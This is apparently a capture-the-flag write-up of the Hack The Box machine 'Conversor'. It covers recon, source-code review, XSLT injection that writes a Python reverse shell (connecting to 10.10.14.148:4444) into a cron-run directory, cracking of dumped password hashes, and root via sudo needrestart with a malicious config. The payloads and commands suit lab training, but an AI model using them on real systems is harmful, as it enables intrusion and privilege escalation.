---
tags:
  - HTB
  - Hacking
  - Boot2Root
  - Linux
  - needrestart
  - XSLT-Injection
---
# Overview

| Name        | Conversor |
| ----------- | --------- |
| OS          | Linux     |
| Base Points | Easy [20] |
| Status      | Done      |
# Recon
## Nmap

```bash
$ sudo nmap -sC -sV -T4 10.10.11.92
[sudo] password for at0m:
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-26 08:53 +0545
Warning: 10.10.11.92 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.11.92
Host is up (0.30s latency).
Not shown: 994 closed tcp ports (reset)
PORT      STATE    SERVICE   VERSION
22/tcp    open     ssh       OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
80/tcp    open     http      Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://conversor.htb/
5950/tcp  filtered unknown
8254/tcp  filtered unknown
9898/tcp  filtered monkeycom
55600/tcp filtered unknown
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![[conversor.png]]

Description says:

```
We are Conversor. Have you ever performed large scans with Nmap and wished for a more attractive display? We have the solution! All you need to do is upload your XML file along with the XSLT sheet to transform it into a more aesthetic format. If you prefer, you can also download the template we have developed here: Download Template
```

It has option to upload XML or XSLT file and also the template is like this:

```bash
$ cat nmap.xslt
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="html" indent="yes" />

  <xsl:template match="/">
    <html>
      <head>
        <title>Nmap Scan Results</title>
        <style>
          body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(120deg, #141E30, #243B55);
            color: #eee;
            margin: 0;
            padding: 0;
          }
          h1, h2, h3 {
            text-align: center;
            font-weight: 300;
          }
          .card {
            background: rgba(255, 255, 255, 0.05);
            margin: 30px auto;
            padding: 20px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
            width: 80%;
          }
          table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 15px;
          }
          th, td {
            padding: 10px;
            text-align: center;
          }
          th {
            background: rgba(255,255,255,0.1);
            color: #ffcc70;
            font-weight: 600;
            border-bottom: 2px solid rgba(255,255,255,0.2);
          }
          tr:nth-child(even) {
            background: rgba(255,255,255,0.03);
          }
          tr:hover {
            background: rgba(255,255,255,0.1);
          }
          .open {
            color: #00ff99;
            font-weight: bold;
          }
          .closed {
            color: #ff5555;
            font-weight: bold;
          }
          .host-header {
            font-size: 20px;
            margin-bottom: 10px;
            color: #ffd369;
          }
          .ip {
            font-weight: bold;
            color: #00d4ff;
          }
        </style>
      </head>
      <body>
        <h1>Nmap Scan Report</h1>
        <h3><xsl:value-of select="nmaprun/@args"/></h3>

        <xsl:for-each select="nmaprun/host">
          <div class="card">
            <div class="host-header">
              Host: <span class="ip"><xsl:value-of select="address[@addrtype='ipv4']/@addr"/></span>
              <xsl:if test="hostnames/hostname/@name">
                (<xsl:value-of select="hostnames/hostname/@name"/>)
              </xsl:if>
            </div>
            <table>
              <tr>
                <th>Port</th>
                <th>Protocol</th>
                <th>Service</th>
                <th>State</th>
              </tr>
              <xsl:for-each select="ports/port">
                <tr>
                  <td><xsl:value-of select="@portid"/></td>
                  <td><xsl:value-of select="@protocol"/></td>
                  <td><xsl:value-of select="service/@name"/></td>
                  <td>
                    <xsl:attribute name="class">
                      <xsl:value-of select="state/@state"/>
                    </xsl:attribute>
                    <xsl:value-of select="state/@state"/>
                  </td>
                </tr>
              </xsl:for-each>
            </table>
          </div>
        </xsl:for-each>
      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>
```
# Enumeration

```bash
$ subfinder -d conversor.htb -silent
```

Nothing.

```bash
$ feroxbuster -u http://conversor.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,php,txt,json,xml -t 50

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://conversor.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [html, php, txt, json, xml]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       22l       50w      722c http://conversor.htb/login
302      GET        5l       22w      199c http://conversor.htb/ => http://conversor.htb/login
200      GET      290l      652w     5938c http://conversor.htb/static/style.css
200      GET       81l      214w     2842c http://conversor.htb/about
302      GET        5l       22w      199c http://conversor.htb/logout => http://conversor.htb/login
200      GET       21l       50w      726c http://conversor.htb/register
200      GET      362l     2080w   178136c http://conversor.htb/static/images/fismathack.png
200      GET    15716l    86534w  7371827c http://conversor.htb/static/source_code.tar.gz
200      GET        0l        0w  2229125c http://conversor.htb/static/images/david.png
200      GET        0l        0w  1688968c http://conversor.htb/static/images/arturo.png
301      GET        9l       28w      319c http://conversor.htb/javascript => http://conversor.htb/javascript/
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
```

```bash
$ wget http://conversor.htb/static/source_code.tar.gz                                                                                             --2025-10-26 09:09:15--  http://conversor.htb/static/source_code.tar.gz
Resolving conversor.htb (conversor.htb)... 10.10.11.92
Connecting to conversor.htb (conversor.htb)|10.10.11.92|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4085760 (3.9M) [application/x-tar]
Saving to: ‘source_code.tar.gz’

source_code.tar.gz                   100%[======================================================================>]   3.90M  1.56MB/s    in 2.5s

2025-10-26 09:09:21 (1.56 MB/s) - ‘source_code.tar.gz’ saved [4085760/4085760]
```

```bash
$ tar -xvf source_code.tar.gz
app.py
app.wsgi
install.md
instance/
instance/users.db
scripts/
static/
static/images/
static/images/david.png
static/images/fismathack.png
static/images/arturo.png
static/nmap.xslt
static/style.css
templates/
templates/register.html
templates/about.html
templates/index.html
templates/login.html
templates/base.html
templates/result.html
uploads/

$ ls
app.py  app.wsgi  install.md  instance  scripts  source_code.tar.gz  static  templates  uploads

$ cat app.py
from flask import Flask, render_template, request, redirect, url_for, session, send_from_directory
import os, sqlite3, hashlib, uuid

app = Flask(__name__)
app.secret_key = 'Changemeplease'

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = '/var/www/conversor.htb/instance/users.db'
UPLOAD_FOLDER = os.path.join(BASE_DIR, 'uploads')
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

def init_db():
    os.makedirs(os.path.join(BASE_DIR, 'instance'), exist_ok=True)
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS files (
        id TEXT PRIMARY KEY,
        user_id INTEGER,
        filename TEXT,
        FOREIGN KEY(user_id) REFERENCES users(id)
    )''')
    conn.commit()
    conn.close()

init_db()

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

@app.route('/')
def index():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT * FROM files WHERE user_id=?", (session['user_id'],))
    files = cur.fetchall()
    conn.close()
    return render_template('index.html', files=files)

@app.route('/register', methods=['GET','POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = hashlib.md5(request.form['password'].encode()).hexdigest()
        conn = get_db()
        try:
            conn.execute("INSERT INTO users (username,password) VALUES (?,?)", (username,password))
            conn.commit()
            conn.close()
            return redirect(url_for('login'))
        except sqlite3.IntegrityError:
            conn.close()
            return "Username already exists"
    return render_template('register.html')
@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))


@app.route('/about')
def about():
 return render_template('about.html')

@app.route('/login', methods=['GET','POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = hashlib.md5(request.form['password'].encode()).hexdigest()
        conn = get_db()
        cur = conn.cursor()
        cur.execute("SELECT * FROM users WHERE username=? AND password=?", (username,password))
        user = cur.fetchone()
        conn.close()
        if user:
            session['user_id'] = user['id']
            session['username'] = username
            return redirect(url_for('index'))
        else:
            return "Invalid credentials"
    return render_template('login.html')


@app.route('/convert', methods=['POST'])
def convert():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    xml_file = request.files['xml_file']
    xslt_file = request.files['xslt_file']
    from lxml import etree
    xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)
    xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)
    xml_file.save(xml_path)
    xslt_file.save(xslt_path)
    try:
        parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
        xml_tree = etree.parse(xml_path, parser)
        xslt_tree = etree.parse(xslt_path)
        transform = etree.XSLT(xslt_tree)
        result_tree = transform(xml_tree)
        result_html = str(result_tree)
        file_id = str(uuid.uuid4())
        filename = f"{file_id}.html"
        html_path = os.path.join(UPLOAD_FOLDER, filename)
        with open(html_path, "w") as f:
            f.write(result_html)
        conn = get_db()
        conn.execute("INSERT INTO files (id,user_id,filename) VALUES (?,?,?)", (file_id, session['user_id'], filename))
        conn.commit()
        conn.close()
        return redirect(url_for('index'))
    except Exception as e:
        return f"Error: {e}"

@app.route('/view/<file_id>')
def view_file(file_id):
    if 'user_id' not in session:
        return redirect(url_for('login'))
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT * FROM files WHERE id=? AND user_id=?", (file_id, session['user_id']))
    file = cur.fetchone()
    conn.close()
    if file:
        return send_from_directory(UPLOAD_FOLDER, file['filename'])
    return "File not found"
```
# Initial Foothold

XSLT Processing with `lxml.etree`.

```bash
$ cat install.md
To deploy Conversor, we can extract the compressed file:

"""
tar -xvf source_code.tar.gz
"""

We install flask:

"""
pip3 install flask
"""

We can run the app.py file:

"""
python3 app.py
"""

You can also run it with Apache using the app.wsgi file.

If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.

"""
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
"""
```

```bash
"""
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
"""
```

- Runs every minute as `www-data`
- Executes ALL Python files in the scripts directory
- This gave us code execution

XML put anything normal `test.xml`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<nmaprun scanner="nmap" args="nmap -sV 127.0.0.1" start="1234567890" version="7.80" xmloutputversion="1.04">
<host starttime="1234567890" endtime="1234567899">
<status state="up" reason="localhost-response"/>
<address addr="127.0.0.1" addrtype="ipv4"/>
<hostnames>
<hostname name="localhost" type="PTR"/>
</hostnames>
<ports>
<port protocol="tcp" portid="22">
<state state="open" reason="syn-ack" reason_ttl="64"/>
<service name="ssh" product="OpenSSH" version="8.9p1 Ubuntu 3ubuntu0.13" extrainfo="Ubuntu Linux; protocol 2.0" method="probed" conf="10"/>
</port>
<port protocol="tcp" portid="80">
<state state="open" reason="syn-ack" reason_ttl="64"/>
<service name="http" product="Apache httpd" version="2.4.52" extrainfo="(Ubuntu)" method="probed" conf="10"/>
</port>
</ports>
</host>
</nmaprun>
```

`shell.xslt` modified from [PayloadAllThings](https://swisskyrepo.github.io/PayloadsAllTheThings/XSLT%20Injection/#write-files-with-exslt-extension). 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:exsl="http://exslt.org/common"
    extension-element-prefixes="exsl"
    version="1.0">

<xsl:template match="/">
  <exsl:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.148",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
  </exsl:document>
</xsl:template>
</xsl:stylesheet>
```

Wait 60 sec to get shell.

```bash
$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.148] from (UNKNOWN) [10.10.11.92] 57332
$ ls
conversor.htb
$ cd /home
$ ls
fismathack
$ cd fismathack
/bin/sh: 4: cd: can't cd to fismathack
$ cd /var/www
$ ls
conversor.htb
$ cd conversor.htb
$ ls
app.py
app.wsgi
instance
__pycache__
scripts
static
templates
uploads
$ ls -la
total 44
drwxr-x--- 8 www-data www-data 4096 Aug 14 21:34 .
drwxr-x--- 3 www-data www-data 4096 Aug 15 05:19 ..
-rwxr-x--- 1 www-data www-data 4466 Aug 14 20:50 app.py
-rwxr-x--- 1 www-data www-data   92 Jul 31 04:00 app.wsgi
drwxr-x--- 2 www-data www-data 4096 Oct 25 20:09 instance
drwxr-x--- 2 www-data www-data 4096 Aug 14 21:34 __pycache__
drwxr-x--- 2 www-data www-data 4096 Oct 25 20:09 scripts
drwxr-x--- 3 www-data www-data 4096 Oct 16 13:48 static
drwxr-x--- 2 www-data www-data 4096 Aug 15 23:48 templates
drwxr-x--- 2 www-data www-data 4096 Oct 25 20:11 uploads
$ whoami
www-data
```

```bash
www-data@conversor:~/conversor.htb/instance$ sqlite3 users.db "SELECT * FROM users;"
<b/instance$ sqlite3 users.db "SELECT * FROM users;"
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
5|user1|24c9e15e52afc47c225b757e7bee1f9d
6|beluga|2af9b1ba42dc5eb01743e6b3759b6e4b
7|notbevyn|417e4705aee1415f8583243b8c403af3
8|jojo|7510d498f23f5815d3376ea7bad64e29
```

Crack hash from crackstation `fismathack:Keepmesafeandwarm`.

```bash
$ ssh fismathack@conversor.htb

Last login: Sat Oct 25 20:27:04 2025 from 10.10.14.148
fismathack@conversor:~$ cat user.txt
0f10412fe5d013442ada9e976fe2b888
```
# Privilege Escalation
## `needrestart`

`needrestart` is a utility that checks which services need restarting after updates. The `-c` option specifies a config file.

```bash
fismathack@conversor:~$ sudo -l
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

```bash
fismathack@conversor:~$ /usr/sbin/needrestart -h
Unknown option: h
Usage:

  needrestart [-vn] [-c <cfg>] [-r <mode>] [-f <fe>] [-u <ui>] [-(b|p|o)] [-klw]

    -v          be more verbose
    -q          be quiet
    -m <mode>   set detail level
        e       (e)asy mode
        a       (a)dvanced mode
    -n          set default answer to 'no'
    -c <cfg>    config filename
    -r <mode>   set restart mode
        l       (l)ist only
        i       (i)nteractive restart
        a       (a)utomatically restart
    -b          enable batch mode
    -p          enable nagios plugin mode
    -o          enable OpenMetrics output mode, implies batch mode, cannot be used simultaneously with -p
    -f <fe>     override debconf frontend (DEBIAN_FRONTEND, debconf(7))
    -t <seconds> tolerate interpreter process start times within this value
    -u <ui>     use preferred UI package (-u ? shows available packages)

  By using the following options only the specified checks are performed:
    -k          check for obsolete kernel
    -l          check for obsolete libraries
    -w          check for obsolete CPU microcode

    --help      show this help
    --version   show version information
```

```bash
fismathack@conversor:~$ echo 'system("/bin/bash");' > /tmp/root.sh 
fismathack@conversor:~$ sudo /usr/sbin/needrestart -c /tmp/root.sh 
root@conversor:/home/fismathack#
```

Or this also seems to work [CVE-2024-48990](https://github.com/ten-ops/CVE-2024-48990_needrestart) for root.

---
